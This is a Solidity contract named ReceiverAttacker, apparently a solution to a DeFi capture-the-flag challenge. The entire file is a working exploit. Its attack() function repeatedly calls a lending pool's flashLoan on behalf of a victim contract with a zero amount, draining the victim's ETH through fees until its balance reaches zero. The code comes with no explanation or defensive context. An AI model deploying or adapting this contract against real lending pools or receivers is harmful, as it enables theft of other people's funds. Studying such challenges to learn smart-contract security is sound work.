// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReceiverAttacker {
    address pool;
    address victim;

    constructor (address _pool, address _victim) {
        pool = _pool;
        victim = _victim;
    }

    function attack() external {
        while (victim.balance > 0) {
            (bool success, ) = pool.call(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)", 
                    victim,
                    0
                    )
            );

            require(success, "Attacker Call failed");
        }
    }
}